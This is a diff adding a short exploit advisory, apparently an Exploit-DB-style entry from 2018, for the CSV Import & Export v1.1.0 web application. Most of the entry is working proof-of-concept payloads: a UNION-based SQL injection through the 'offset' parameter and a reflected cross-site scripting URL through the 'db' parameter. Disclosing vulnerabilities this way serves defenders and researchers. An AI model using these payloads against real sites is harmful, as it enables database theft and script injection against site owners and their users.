@@ -1,0 +1,31 @@
+# Exploit Title: CSV Import & Export v1.1.0 - SQL Injection / Cross-Site
+Scripting
+# Dork: N/A
+# Date: 30.05.2018
+# Exploit Author: Kağan Çapar
+# Contact: kagancapar@gmail.com
+# Vendor Homepage: https://codecanyon.net/item/csv-import-export/21105509
+# Version: 1.1.0
+# Category: Webapps
+# Tested on: Kali Linux
+# Description : The 'offset' and 'db' parameters in the database table
+preview query has vulnerabilities.
+====================================================
+# PoC : SQLi :
+
+Parameter: offset (GET)
+    Type: UNION query
+    Demo:
+https://site.com/live-preview/live-preview-db-tables.php?action=export_getInput&db=car-shop@localhost:3306&table=clients&order=asc&offset=30&limit=10
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: action=export_getInput&db=car-shop@localhost:3306&table=clients&order=asc&offset=30
+UNION ALL SELECT
+NULL,NULL,NULL,CONCAT(0x7178707671,0x78564b6846794858636354787350514d467a4863704d7a50735068495a6f7a5552625046616d6273,0x71786b7171),NULL,NULL,NULL,NULL,NULL,NULL--
+STgb&limit=10
+
+
+====================================================
+# PoC : XSS :
+
+Payload =
+https://site.com/live-preview/live-preview-db-tables.php?action=export_getInput&db=%3E%27%3E%22%3E%3Cimg%20src=x%20onerror=alert%280%29%3E&table=clients&order=asc&offset=30&limit=10
